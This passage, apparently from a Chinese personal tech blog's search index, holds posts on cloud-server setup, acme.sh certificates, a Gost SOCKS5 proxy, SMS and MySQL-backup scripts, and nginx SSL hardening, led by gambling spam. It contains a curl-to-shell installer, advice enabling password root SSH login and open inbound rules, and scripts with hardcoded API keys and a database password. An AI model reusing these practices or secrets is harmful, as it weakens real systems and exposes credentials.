bet365用途 365k导航服务器站点 bet3656. 配置安全组选择现有的安全组。 选择对应的名称。all默认放行最后审核启动，选择秘钥对。选择web-hk 2.连接服务器 12345678910111213141516171819202122获取公共dns或ipv6地址以及ipv4获取用户名: centos系统名字为centos Ubuntu系统为ubuntussh -i web-hk.pem centos@ec2-35-72-162-1.ap-northeast-1.compute.amazonaws.comssh -i web-hk.pem ubuntu@16.162.159.214也可以通过xshell连接。输入相关连接信息就可以了。设置root密码sudo -i passwd rootroot登录打开vi /etc/ssh/sshd_config找到下面的内容，把注释打开 没有就手动添加PermitRootLogin yesPasswordAuthentication yes通过sed修改sed -i 's/\\#PermitRootLogin yes/PermitRootLogin yes/g' /etc/ssh/sshd_configsed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config最后，重启sshservice sshd restart 分配弹性公网ip地址 123456分配弹性ip后。点击操作 关联实例虚拟机然后就可以了。最后apt-get update apt-get install -y lrzsz 上传部署脚本就可以部署了。 微软云选择服务器 123456选择centos，和亚马逊差不多开通方式。只是创建好虚拟机实例后需要设置网络。然后添加入站规则。允许所有访问。也是一样修改root可远程登录vi /etc/ssh/sshd_config找到下面的内容，把注释打开 没有就手动添加PermitRootLogin yesPasswordAuthentication yes","link":"/2021/07/07/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E9%80%9A/"},{"title":"一键自动生成ssl证书","text":"一键自动生成ssl证书 acme.sh实现了acme协议，可以从letsencrypt生成免费的证书。 下面详细介绍。 1.安装acme.sh安装很简单，一个命令： 1curl https://get.acme.sh | sh 普通用户和root用户都可以安装使用。安装过程进行了以下几步： 把acme.sh安装到你的home目录下： 1~/.acme.sh/ 并创建一个bash的别名，方便你的使用： alias acme.sh=~/.acme.sh/acme.sh 2）。自动为您创建cronjob，每天0:00点自动检测所有的证书，如果快过期了，需要更新，即可自动更新证书。 更高级的安装选项请参考：https : //github.com/Neilpang/acme.sh/wiki/操作方法 安装过程不会污染现有的系统任何功能和文件，所有的修改都限制在安装目录中：~/.acme.sh/ 2.生成证书acme.sh实现了acme协议支持的所有验证协议。一般有两种方式验证：http和dns验证。 1. http方式需要在你的网站根目录下放置一个文件，来验证你的域名所有权，完成验证。然后就可以生成证书了。 1234acme.sh --issue -d mydomain.com -d www.mydomain.com --webroot /home/wwwroot/mydomain.com/-d指定域名--webroot 指定域名所在网站根目录 只需要指定域名，并指定域名所在的网站根目录。acme.sh会自动的生成验证文件，并放到网站的根目录，然后自动完成验证。最后会聪明的删除验证文件。整个过程没有任何争议。 如果您用的apache服务器，acme.sh还可以智能的从apache的配置中自动完成验证，您不需要指定网站根目录： 1acme.sh --issue -d mydomain.com --apache 如果您用的nginx服务器，或反代，acme.sh还可以智能的从nginx的配置中自动完成验证，您不需要指定网站根目录： 1acme.sh --issue -d mydomain.com --nginx 请注意，无论是apache还是nginx模式，acme.sh在完成验证之后，会恢复到之前的状态，都不会私自更改您本身的配置。好处是你不用担心配置被搞坏，也有一个缺点，你需要自己配置ssl的配置，否则只能成功生成证书，你的网站还是无法访问https。但是为了安全，你还是自己手动改配置吧。 如果您还没有运行任何web服务，80端口是重置的，那么acme.sh还是假装自己是一个web服务器，临时听在80端口，完成验证： 1acme.sh --issue -d mydomain.com --standalone 更高级的用法请参考：https : //github.com/Neilpang/acme.sh/wiki/How-to-issue-a-cert 2.手动dns方式，手动在域名上添加一条txt解析记录，验证域名所有权 这种方式的好处是，您不需要任何服务器，不需要任何公网ip，只需要dns的解析记录即可完成验证。坏处是，如果不同时配置自动DNS API，使用这种方式acme.sh将无法自动更新证书，每次都需要手动重新重新解析验证域名所有权。 1acme.sh --issue --dns -d mydomain.com 然后，acme.sh会生成相应的解析记录显示出来，你只需要在你的域名管理面板中添加这条txt记录即可。 等待解析完成之后，重新生成证书： 1acme.sh --renew -d mydomain.com 注意第二次这里用的是 --renew dns方式的真正强大之处在于可以使用域名解析商提供的api自动添加txt记录完成验证。 acme.sh目前支持cloudflare，dnspod，cloudxns，godaddy以及ovh等数十种解析商的自动集成。 以dnspod特别，你需要先登录到dnspod账号，生成你的api id和api key，都是免费的。然后： 12345export DP_Id=&quot;1234&quot;export DP_Key=&quot;sADDsdasdgdsf&quot;acme.sh --issue --dns dns_dp -d aa.com -d www.aa.com 证书就会自动生成了。这里称为的api id和api key会被自动记录下来，将来你在使用dnspod api的时候，就不需要再次指定了。直接生成就好了： 1acme.sh --issue -d mydomain2.com --dns dns_dp 更详细的api用法：https : //github.com/Neilpang/acme.sh/blob/master/dnsapi/README.md 3.复制/安装证书前面证书生成以后，接下来需要把证书副本复制到真正需要用它的地方。 请注意，默认生成的证书都放在安装目录下：~/.acme.sh/，请不要直接使用此目录下的文件，例如：不要直接让nginx / apache的配置文件使用这下面的文件。这里面的文件都是内部使用，而且目录结构可能会变化。 正确的使用方法是使用--installcert命令，并指定目标位置，然后证书文件会被copy到相应的位置，例如： 123456789101112acme.sh --installcert -d &lt;domain&gt;.com \\ --key-file /etc/nginx/ssl/&lt;domain&gt;.key \\ --fullchain-file /etc/nginx/ssl/fullchain.cer \\ --reloadcmd &quot;service nginx force-reload&quot; 示列： mkdir /software/ssl/wv-ps365.net -p acme.sh --install-cert -d wv-ps365.net \\--key-file /software/ssl/wv-ps365.net/key.pem \\--fullchain-file /software/ssl/wv-ps365.net/cert.pem \\--reloadcmd &quot;openresty -s reload&quot; （一个小提醒，这里用的是service nginx force-reload，不是service nginx reload，据测试，reload并不会重新加载证书，所以用的force-reload） Nginx的配置ssl_certificate使用/etc/nginx/ssl/fullchain.cer，而非/etc/nginx/ssl/.cer，否则SSL Labs的测试会报Chain issues Incomplete错误。 --installcert命令可以携带很多参数，来指定目标文件。并且可以指定reloadcmd，当证书更新以后，reloadcmd会被自动调用，让服务器生效。 详细参数请参考：https : //github.com/Neilpang/acme.sh#3-install-the-issued-cert-to-apachenginx-etc 所谓的是，此处指定的所有参数都会被自动记录下来，并在将来证书自动更新以后，被再次自动调用。 4.更新证书目前证书在60天以后会自动更新，你无需任何操作。未来有可能会缩短这个时间，不过都是自动的，你不用担心。 5.更新acme.sh目前由于acme协议和letsencrypt CA都在不断更新，因此acme.sh也经常更新以保持同步。 升级acme.sh到最新版： 1acme.sh --upgrade 如果你不想手动升级，可以开启自动升级： 1acme.sh --upgrade --auto-upgrade 之后，acme.sh就会自动保持更新了。 你也可以随时关闭自动更新： 1acme.sh --upgrade --auto-upgrade 0 6.错误怎么办：如果出错，请添加调试日志： 1acme.sh --issue ..... --debug 或者： 1acme.sh --issue ..... --debug 2 请参考：https : //github.com/Neilpang/acme.sh/wiki/How-to-debug-acme.sh 最后，本文并非完全的使用说明，还有很多高级的功能，更高级的用法请参见其他Wiki页面。 https://github.com/Neilpang/acme.sh/wiki","link":"/2022/06/09/%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90ssl%E8%AF%81%E4%B9%A6/"},{"title":"使用Gost搭建一个简单的sock5代理通道","text":"使用Gost搭建一个快速简单的Socks5代理通道Gost是一个功能多样且实用的安全隧道工具，使用的是go语言编写这里只记录下快速搭建Socks5的过程，其它的并不涉及，有兴趣的朋友可以去项目主页了解下；GitHub项目：https://github.com/ginuerzh/gostGost文档：https://docs.ginuerzh.xyz/gost 特性 多端口监听 可设置转发代理，支持多级转发(代理链) 支持标准HTTP/HTTPS/HTTP2/SOCKS4(A)/SOCKS5代理协议 Web代理支持探测防御 支持多种隧道类型 SOCKS5代理支持TLS协商加密 Tunnel UDP over TCP TCP/UDP透明代理 本地/远程TCP/UDP端口转发 支持Shadowsocks(TCP/UDP)协议 支持SNI代理 权限控制 负载均衡 路由控制 DNS解析和代理 TUN/TAP设备 搭建x86框架机型 123456wget --no-check-certificate https://github.com/ginuerzh/gost/releases/download/v2.11.2/gost-linux-386-2.11.2.gz解压gzip -d gost-linux-386-2.11.2.gz mv gost-linux-386-2.11.2 /usr/bin/gostchmod +x /usr/bin/gost 需要下载其他架构的也可以下载对应的 1https://github.com/ginuerzh/gost/releases/ amd64框架机型 1234567wget &quot;https://github.com/ginuerzh/gost/releases/download/v2.11.2/gost-darwin-amd64-2.11.2.gz&quot;gzip -d gost-darwin-amd64-2.11.2.gz mv gost-darwin-amd64-2.11.2 /usr/bin/gostchmod +x /usr/bin/gost 开启代理 12345678## 无需认证（修改端口号即可）gost -L socks5://:1080## 开启认证（其中的 “账号” “密码” “端口” 自行修改）gost -L 账号:密码@:端口 socks5://:端口gost -L hkvpn:123.shui@:1180 socks5://1180## 测试没问题后可以用`nohup`命令挂载到后台运行，重启失效，再次挂载即可重新使用；nohup gost -L 账号:密码@:端口 socks5://:端口 &gt; /dev/null 2&gt;&amp;1 &amp; 开启防火墙端口 12iptables -I INPUT -p udp -m multiport --dports 1180 -j ACCEPTiptables -I INPUT -p tcp -m multiport --dports 1180 -j ACCEPT 关闭代理 1kill -9 $(ps aux | grep &quot;gost&quot; | sed '/grep/d' | awk '{print $2}') 编辑/etc/gost.json文件可修改配置数据","link":"/2022/06/01/%E4%BD%BF%E7%94%A8Gost%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E7%AE%80%E5%8D%95%E7%9A%84Socks5%E4%BB%A3%E7%90%86%E9%80%9A%E9%81%93/"},{"title":"利用Python实现文件拆分","text":"利用python实现文件拆分工作中需要把一个大文件。以指定行分割成几份小文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# -*- coding:utf-8 -*-from datetime import datetimeimport osdef Main(): source_dir = 'chaifen.txt' if not os.path.exists(&quot;split&quot;): os.mkdir(r&quot;split&quot;) target_dir = 'split' # 计数器 flag = 0 input(&quot;请把需要拆分的文件命名为chaifen.txt,命名好后按回车继续&quot;) # 文件名 name = 1 chaifen_line = int(input(&quot;请输入要以多少行为标准进行拆分: &quot;)) # 存放数据 dataList = [] print(&quot;开始。。。。。&quot;) print(datetime.now().strftime('%Y-%m-%d %H:%M:%S')) with open(source_dir, 'r' ,encoding='utf-8') as f_source: for line in f_source: flag += 1 dataList.append(line) if flag == chaifen_line: filePath = os.path.join(target_dir, &quot;new_chaifei_&quot; + str(name) + &quot;.txt&quot;) with open( filePath, 'w+', encoding='utf-8') as f_target: for data in dataList: f_target.write(data) name += 1 flag = 0 dataList = [] # 处理最后一批行数少于4.5万行的 filePath = os.path.join(target_dir, &quot;new_chaifei_&quot; + str(name) + &quot;.txt&quot;) with open(filePath, 'w+') as f_target: for data in dataList: f_target.write(data) print(&quot;完成。。。。。&quot;) print(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))if __name__ == &quot;__main__&quot;: Main() 把需要拆分的文件放在当前脚本目录命名为chaifen.txt就可以了 121.先生成.exe文件。方便其他电脑也可以直接运行pyinstaller -F -i zidonghua\\tu\\favicon.ico chaifen.py 运行完之后会在spilt目录生成新的拆分后的文件。","link":"/2021/07/23/%E5%88%A9%E7%94%A8python%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E6%8B%86%E5%88%86/"},{"title":"python3发送邮件","text":"一，发送邮件 123456789101112131415161718192021222324252627282930313233343536373839# 接口类型：互亿无线触发短信接口，支持发送验证码短信、订单通知短信等。# 账户注册：请通过该地址开通账户http://sms.ihuyi.com/register.html# 注意事项：# （1）调试期间，请用默认的模板进行测试，默认模板详见接口文档；# （2）请使用APIID（查看APIID请登录用户中心-&gt;验证码短信-&gt;产品总览-&gt;APIID）及 APIkey来调用接口；# （3）该代码仅供接入互亿无线短信接口参考使用，客户可根据实际需要自行编写；# !/usr/local/bin/python# -*- coding:utf-8 -*-import http.clientimport urllibhost = &quot;106.ihuyi.com&quot;sms_send_uri = &quot;/webservice/sms.php?method=Submit&quot;# 用户名是登录用户中心-&gt;验证码短信-&gt;产品总览-&gt;APIIDaccount = &quot;C42206392&quot;# 密码 查看密码请登录用户中心-&gt;验证码短信-&gt;产品总览-&gt;APIKEYpassword = &quot;7b1893c3e21a7a944a45512eb1c0225b&quot;def send_sms(text, mobile): params = urllib.parse.urlencode( {'account': account, 'password': password, 'content': text, 'mobile': mobile, 'format': 'json'}) headers = {&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Accept&quot;: &quot;text/plain&quot;} conn = http.client.HTTPConnection(host, port=80, timeout=30) conn.request(&quot;POST&quot;, sms_send_uri, params, headers) response = conn.getresponse() response_str = response.read() conn.close() return response_strif __name__ == '__main__': mobile = &quot;18318821906&quot; text = &quot;您的验证码是：121254。请不要把验证码泄露给其他人。&quot; print(send_sms(text, mobile))","link":"/2020/08/04/%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/"},{"title":"备份docker里的数据库","text":"备份docker部署的数据库 123456789101112131415#!/bin/bash#7天前Sevendays_ago=$(date &quot;+%Y-%m-%d&quot; -d '7 day ago')#当前时间timea=`echo $(date &quot;+%Y-%m-%d-%R&quot;)`#当天时间timeb=`echo $(date &quot;+%Y-%m-%d&quot;)`mkdir -p /mysqlbackup/${timeb}docker exec mysql sh -c 'exec mysqldump --all-databases -uroot -p123.yichen' &gt; /mysqlbackup/${timeb}/${timea}.sqlrm -rf /mysqlbackup/${Sevendays_ago}* &gt;&gt;/dev/null 设置定时任务每隔3小时执行 100 */3 * * * /root/mysqlbackup.sh 数据库的恢复 1 使用docker cp 命令 复制.sql文件到容器中的目录 123docker cp /mysqlbackup/当前备份日期/最新时间mysqlall.sql mysql:/tmp/docker exec mysql bash -c ' exec mysql -uroot -p123.yichen &lt; /tmp/最新时间mysqlall.sql' 或 2，进入容器内部，导入sql文件到数据库 123456789docker exec -it 容器名 bashmysql -uroot -ppassworduse database_name;source /tmp/最新时间mysqlall.sql;show tables;","link":"/2020/08/04/%E5%A4%87%E4%BB%BDdocker%E9%83%A8%E7%BD%B2%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"title":"可以免费压缩图片的网站","text":"分享几个可以免费压缩图片的网站1，tinypng 12特点: 同时上传20张图片，单张不超过5M网站地址: https://tinypng.com/ 2, Iloveimg 12特点: 可以压缩，可以调整图片大小和转换图片格式https://www.iloveimg.com/zh-cn/compress-image 3，docsmall 12特点: 可以同时上传30张图片，单张大小不超过25M,支持gif动图压缩。https://docsmall.com/image-compress 图片在线转换编码工具网站1, 菜鸟工具 12# 前端工具，里面很多实用的工具。https://c.runoob.com/front-end/ 2，图片转换成编码 1234https://c.runoob.com/front-end/59data:image/jpeg;base64,复制这后面的字符。最后加#图片后缀(如jpg) #jpg 3, 图片编码转换成图片 12345特点: 可以图片可以转换成编码，也可以编码转换成图片base64编码转换回图片http://tool.chinaz.com/tools/imgtobase/加上前面data:image/jpeg;base64,即可。","link":"/2022/04/20/%E5%8F%AF%E4%BB%A5%E5%85%8D%E8%B4%B9%E5%8E%8B%E7%BC%A9%E5%9B%BE%E7%89%87%E7%9A%84%E7%BD%91%E7%AB%99/"},{"title":"加强nginx_ssl安全","text":"如何在nginx的web服务器上设置更强的SSL。通过使SSL无效来减弱CRIME攻击的这种方法实现。不使用在协议中易受攻击的SSLv3以及以下版本并且我们会设置一个更强的密码套件为了在可能的情况下能够实现Forward Secrecy，同时还启用HSTS和HPKP。这样就有了一个更强、不过时的SSL配置 在nginx的设置文档中如下编辑 /etc/nginx/conf.d/nginx.conf (On RHEL/CentOS). 编辑服务器配置的服务器那块和443端口（SSL配置） 编辑之前做备份！ SSL 压缩（犯罪攻击）通常来说，犯罪攻击使用 SSL 压缩来施展它的魔法。SSL 压缩在 nginx1.1.6+/1.0.9+ 中默认是关闭的（如果使用 openssl 1.0.0+). 如果你正在使用 nginx 或者 OpenSSL 其他早期版本，并且你的发行版并没有回迁此选项，那么你需要重新编译不支持 ZLIB 的 OpenSSL。这将禁止使用DEFLATE压缩方法来使用 OpenSSL。如果你这样做，那么你仍然可以使用常规的HTML DEFLATE压缩。 SSLV2 与 SSLv3SSL v2 并不安全，因此我们需要禁用它。我们也可以禁用 SSL v3，当 TLS 1.0 遭受一个降级攻击时，可以允许一个攻击者强迫使用 SSL v3 来连接，因此禁用“向前保密”。 再次编辑此配置文件： 1ssl_protocols TLSv1 TLSv1.1 TLSv1.2; 贵宾犬攻击和TLS-FALLBACK-SCSVSSLv3允许利用“贵宾犬 POODLE”漏洞，这是禁用它的一个主要原因。Google已经提议一种叫TLSFALLBACKSCSV的SSL/TLS的拓展，旨在防止强制SSL降级。以下是升级后自动启用的OpenSSL版本： OpenSSL 1.0.1 有 TLSFALLBACKSCSV 在 1.0.1j 及更高的版本. OpenSSL 1.0.0 有 TLSFALLBACKSCSV 在 1.0.0o 及更高的版本. OpenSSL 0.9.8 有 TLSFALLBACKSCSV 在 0.9.8zc 及更高的版本. 密码套件Forward Secrecy 确保了在永久密钥被泄漏的事件中，会话密钥的完整性。PFS 实现这些是通过执行推导每个会话的新密钥来完成。 这意味着当私有密钥被泄露不能用来解密SSL流量记录。 密码套件提供 Perfect Forward Secrecy 暂时使用 Diffie-Hellman 密钥交换的形式。他们的缺点是开销大，这可以通过使用椭圆曲线的变异的改进。 我建议以下两个密码套件，后者来自 Mozilla 基金会。 推荐的密码套件: 1ssl_ciphers 'AES128+EECDH:AES128+EDH'; 推荐的密码套件向后兼容(IE6 / WinXP): 1ssl_ciphers &quot;ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA:DES-CBC3-SHA:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!MD5:!PSK:!RC4&quot;; 如果您的 OpenSSL 是旧版本，不可用密码将被自动丢弃。总是使用完整的密码套件，让OpenSSL选它所支持的。 密码套件的顺序非常重要，因为它决定在优先级算法将被选中。上面的建议重视算法提供完美的向前保密。 老版本的 OpenSSL 可能不会返回算法的完整列表。AES-GCM 和一些 ECDHE 相当近，而不是出现在大多数版本的 Ubuntu OpenSSL 附带或 RHEL。 优先级逻辑 首先选择 ECDHE + AESGCM 密码。这些都是 TLS 1.2 密码并没有受到广泛支持。这些密码目前没有已知的攻击目标。 PFS 密码套件是首选，ECDHE 第一，然后 DHE。 AES 128 更胜 AES 256。有讨论是否 AES256 额外的安全是值得的成本，结果远不明显。目前，AES128 是首选的，因为它提供了良好的安全，似乎真的是快，更耐时机攻击。 向后兼容的密码套件，AES 优先 3DES。暴力攻击 AES 在 TLS1.1 及以上，减轻和 TLS1.0 中难以实现。向后不兼容的密码套件，3DES 不存在. RC4 被完全移除. 3DES 用于向后兼容。 强制性的丢弃 aNULL 包含未验证 diffie - hellman 密钥交换，受到中间人这个攻击 eNULL 包含未加密密码(明文) EXPORT 被美国法律标记为遗留弱密码 RC4 包含了密码，使用废弃ARCFOUR算法 DES 包含了密码，使用弃用数据加密标准 SSLv2 包含所有密码,在旧版本中定义SSL的标准,现在弃用 MD5 包含所有的密码，使用过时的消息摘要5作为散列算法 其它的设置确保你已经添加了以下几行： 12ssl_prefer_server_ciphers on;ssl_session_cache shared:SSL:10m; 在SSLv3或这是TLSv1握手时选择一个密码，通常是使用客户端的偏好。如果这个指令是启用的，那么服务器反而是使用服务器的偏好。 向前保密（Forward Secrecy）与Diffie Hellman Ephemeral Parameters向前保密的概念很简单：客户端和服务器协商一个可靠的密钥，并在会话结束后销毁。服务器中的RSA私钥用来签名客户端和服务器之间交换的Diffie-Hellman密钥。副主密钥从Diffie-Hellman握手中得到，并用于加密。由于副主密钥在客户端和服务器之间的连接中是明确具体的，并用于有限的时间，因此被叫作Ephemeral(短暂的)。 由于有Forward Secrecy，即使攻击者持有服务器的私钥，也不能够解密过去的会话。私钥仅仅用来签名DH（Diffie-Hellman）的握手，它并没有泄漏副主密钥。Diffie-Hellman确保了副主密钥不会离开客户端和服务器，也不会被中间人截获。 1.4.4所有的nginx版本在往Diffiel-Hellman输入参数时依赖OpenSSL。不幸的时，这就意味着Ephemeral Diffiel-Hellman（DHE）会使用OpenSSL的这一缺陷，包括一个1024位的交换密钥。由于我们正在使用一个2048位的证书，DHE客户端比非ephemeral客户端将使用一个更弱的密钥交换。 我们需要产生一个更强的DHE参数：这需要大约30分钟时间，取决于服务器的性能 12cd /etc/ssl/certsopenssl dhparam -out dhparam.pem 4096 如果nginx是在容器里边，就把文件cp到容器的目录下 1docker cp /etc/ssl/certs/dhparam.pem app_nginx_1:/etc/ssl/certs/ 然后告诉nginx在DHE密钥交换的时候使用它： 1ssl_dhparam /etc/ssl/certs/dhparam.pem; OCSP 适用在和服务器连接的时候，客户端通过使用证书撤销列表（CRL）来验证服务器证书的有效性，或者是使用在线证书状态协议（OCSP）记录。但是CRL的问题是：CRL的列表项不断增多，而且需要不断地下载。 OCSP是更轻量级的，因为它一次只获取一条记录。但是副作用是，当连接到服务器的时候，OCSP请求必须发送到第三方响应者，这增加了延迟，以及失败的可能。实际上，OCSP响应者由CA操控，由于它常常不可靠，导致浏览器由于收不到适时的响应而失败。这减少了安全性，因为它允许攻击者对OCSP响应者进行DoS攻击来取消验证。 解决方案是在TLS握手期间，允许服务器发送缓存的OCSP记录，这样来绕过OCSP响应者。这个技术节省了在客户端和OCSP响应者之间的一个来回，称为OCSP闭合（OCSP Stapling）。 服务器只在客户端请求的时候，发送一个缓存的OCSP响应，通过对CLIENT HELLO的status_request TLS拓展来声明支持。 大多数服务器都会缓存OCSP响应到48小时。在常规间隔，服务器会连接到CA的OCSP响应者来获取最新的OCSP记录。OCSP响应者的位置是从签名证书的Authority Information Access 字段来获取。 解决方案是允许服务器在TLS握手期间发送其缓存的OCSP记录，从而绕过OCSP响应器。此机制节省了客户端和OCSP响应者之间的往返时间，称为OCSP装订。 通过在客户端HELLO中声明对status_request TLS扩展的支持，服务器仅在客户端请求时才发送缓存的OCSP响应。 大多数服务器最多可以缓存OCSP响应48小时。服务器将以固定的时间间隔连接到CA的OCSP响应者，以检索新的OCSP记录。OCSP响应者的位置来自已签名证书的“权限信息访问”字段。 什么是OCSP装订OCSP装订在IETF RFC 6066中定义。术语“装订”是一个流行的术语，用于描述Web服务器如何获得OCSP响应。Web服务器缓存来自颁发证书的CA的响应。启动SSL / TLS握手后，Web服务器通过将缓存的OCSP响应附加到CertificateStatus消息，将响应返回到客户端。要使用OCSP装订，客户端必须在其SSL / TSL客户端“ Hello”消息中包括“ status_request”扩展名。 OCSP装订具有以下优点： 依赖方在需要时（在SSL / TLS握手期间）会收到Web服务器证书的状态。 无需与发布CA设置其他HTTP连接。 OCSP装订通过减少攻击媒介的数量提供了更高的安全性。 阅读 一个 的 在 以下 链接进行更多 的OCSP和OCSP装订信息。 要求您至少需要nginx 1.3.7才能起作用。当前的Ubuntu LTS版本（12.04）中不提供此功能，它具有1.1.19，在CentOS上，您需要EPEL或官方存储库。但是，安装最新版本的nginx很容易。 您还需要创建防火墙例外，以允许您的服务器建立与上游OCSP的出站连接。您可以使用这一种衬垫从网站上查看所有OCSP URI： 1OLDIFS=$IFS; IFS=':' certificates=$(openssl s_client -connect google.com:443 -showcerts -tlsextdebug -tls1 2&gt;&amp;1 &lt;/dev/null | sed -n '/-----BEGIN/,/-----END/ {/-----BEGIN/ s/^/:/; p}'); for certificate in ${certificates#:}; do echo $certificate | openssl x509 -noout -ocsp_uri; done; IFS=$OLDIFS 结果是google.com在： 12http://clients1.google.com/ocsphttp://gtglobal-ocsp.geotrust.com nginx配置将以下配置添加到您的https（443）server块： 1234ssl_stapling on;ssl_stapling_verify on;resolver 8.8.8.8 8.8.4.4 valid=300s;resolver_timeout 5s; 为了使OCSP装订工作，应该知道服务器证书颁发者的证书。如果ssl_certificate文件不包含中间证书，则服务器证书颁发者的证书应存在于ssl_trusted_certificate文件中。 我的raymii.org证书由发行Positive CA 2。该证书由颁发Addtrust External CA Root。在我的nginx ssl_certificate文件中，所有这些证书都存在。如果不是这种情况，请使用证书链创建一个文件，并按以下方式使用它： 1ssl_trusted_certificate /etc/ssl/certs/domain.chain.stapling.pem; 在版本1.1.7之前，只能配置一个名称服务器。从版本1.3.1和1.2.2开始，支持使用IPv6地址指定名称服务器。默认情况下，nginx将在解析时同时查找IPv4和IPv6地址。如果不需要查找IPv6地址，则ipv6=off 可以指定该参数。从版本1.5.8开始，支持将名称解析为IPv6地址。 默认情况下，nginx使用响应的TTL值缓存答案。（可选）valid参数允许将其改写为5分钟。在1.1.9版之前，无法调整缓存时间，nginx始终将答案缓存5分钟。 重新启动您的nginx以加载新配置： 1service nginx restart 它应该工作。让我们测试一下。 测试它启动终端并使用以下OpenSSL命令连接到您的网站： 1openssl s_client -connect example.org:443 -tls1 -tlsextdebug -status 在响应中，查找以下内容： 1234567891011121314151617OCSP response:======================================OCSP Response Data: OCSP Response Status: successful (0x0) Response Type: Basic OCSP Response Version: 1 (0x0) Responder Id: 99E4405F6B145E3E05D9DDD36354FC62B8F700AC Produced At: Feb 3 04:25:39 2014 GMT Responses: Certificate ID: Hash Algorithm: sha1 Issuer Name Hash: 0226EE2F5FA2810834DACC3380E680ACE827F604 Issuer Key Hash: 99E4405F6B145E3E05D9DDD36354FC62B8F700AC Serial Number: C1A3D8D00D72FCE483CD84759E9EC0BC Cert Status: good This Update: Feb 3 04:25:39 2014 GMT Next Update: Feb 7 04:25:39 2014 GMT 这意味着它正在工作。如果收到如下响应，则该响应不起作用： 1OCSP response: no response sent 您还可以使用SSL Labs测试来查看OCSP装订是否有效。 HTTP Strict Transport Security如果可能，你应该开启 HTTP Strict Transport Security (HSTS)，它指示浏览器只通过HTTPS来访问你的站点。 HTTP Public Key Pinning Extension你同样应该开启 HTTP Public Key Pinning Extension。 Public Key Pinning 意味着证书链必须包含处于白名单之中的公钥。它确保只在白名单中的CA可以对*.example.com进行签名，而不是浏览器中保存的任何一个CA。 123456789101112131415161718192021222324server { listen [::]:443 default_server; ssl on; ssl_certificate_key /etc/ssl/cert/raymii_org.pem; ssl_certificate /etc/ssl/cert/ca-bundle.pem; ssl_ciphers 'AES128+EECDH:AES128+EDH:!aNULL'; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_session_cache shared:SSL:10m; ssl_stapling on; ssl_stapling_verify on; resolver 8.8.4.4 8.8.8.8 valid=300s; resolver_timeout 10s; ssl_prefer_server_ciphers on; ssl_dhparam /etc/ssl/certs/dhparam.pem; add_header Strict-Transport-Security max-age=63072000; add_header X-Frame-Options DENY; add_header X-Content-Type-Options nosniff;","link":"/2020/08/03/%E5%8A%A0%E5%BC%BAnginx_ssl%E5%AE%89%E5%85%A8/"},{"title":"python3多任务进程线程","text":"1，多任务原理 1234567891011121314151617181920'''现代操作系统(windows、Mac os X、Linux、UNIX等)都支持&quot;多任务&quot;多任务：操作系统同时可以运行多个任务单核CPU实现多任务原理：操作系统轮流让各个任务交替执行，QQ执行2us,切换到微信，在执行2us,再切换到钉钉，执行2us 表面上看，每个任务反复执行下去，但是CPU调度执行速度太快了，导致我们感觉就像所有任务都在执行一样。 多核CPU实现多任务原理：真正的并行执行多任务只能在多核CPU上实现，但是由于任务数量远远多于CPU核心数量，所以操作系统也会自动把 很多任务轮流调度到每个核心上执行 并发：看上去一起执行。任务数对于CPU核心数 并行：真正的一起执行。任务数小于等于CPU核心数。 实现多任务的方式： 1、多进程模式 其次常用 2、多线程模式 常用1 3、协程模式 4、多进程+多线程模式''' 2, 进程123456'''对于操作系统而言，一个任务就是一个进程进程是系统中程序执行和资源分配的基本单位。每个进程都有自己的数据段、代码段、和堆栈段''' 1，单任务现象12345678910111213141516from time import sleepdef run(): while True: print(&quot;yichen is a nice man&quot;) sleep(1.2)if __name__ == &quot;__main__&quot;: while True: print(&quot;yichen is a good man&quot;) sleep(1) #不会执行到run方法。只有上面的while循环结束才可以执行 run() 2,启动进程实现多任务12345678910111213141516171819202122232425262728293031'''multiprocessing 库跨平台版本的多进程模块，提供了一个Process类来代表一个进程对象'''from multiprocessing import Processfrom time import sleepimport os#子进程需要执行的代码def run(str): while True: #os.getpid() 获取当前进程的id号 #os.getppid() 获取当前进程的父进程id号 print(&quot;yichen is a %s man--%s--%s&quot;%(str,os.getpid(),os.getppid())) sleep(1.2)if __name__ == &quot;__main__&quot;: print(&quot;主(父)进程启动--%s&quot;%(os.getpid())) # 创建子进程 #target说明进程执行的任务 p =Process(target=run,args=(&quot;handsome&quot;,)) #启动进程 p.start() while True: print(&quot;yichen is a good man&quot;) sleep(1) 3,父子进程的先后顺序join12345678910111213141516171819202122232425from multiprocessing import Processfrom time import sleepimport os#子进程需要执行的代码def run(str): print(&quot;子进程启动&quot;) sleep(3) print(&quot;子进程结束&quot;)if __name__ == &quot;__main__&quot;: print(&quot;父进程启动--%s&quot;%(os.getpid())) p =Process(target=run,args=(&quot;handsome&quot;,)) #启动子进程 p.start() sleep(1) #父进程的结束不能影响子进程，让父进程等待子进程结束后再执行父进程 #p.join 等待p子进程结束后再执行后面的内容 p.join() print(&quot;父进程结束&quot;) 4,全局变量在多个进程中不能共享1234567891011121314151617181920212223242526from multiprocessing import Processfrom time import sleepnum = 100def run(): print(&quot;子进程开始&quot;) global num # 相当于引入了num = 100 num += 1 print(num) print(&quot;子进程结束&quot;)if __name__ ==&quot;__main__&quot;: print(&quot;父进程开始&quot;) p = Process(target=run) p.start() p.join() p2 = Process(target=run) 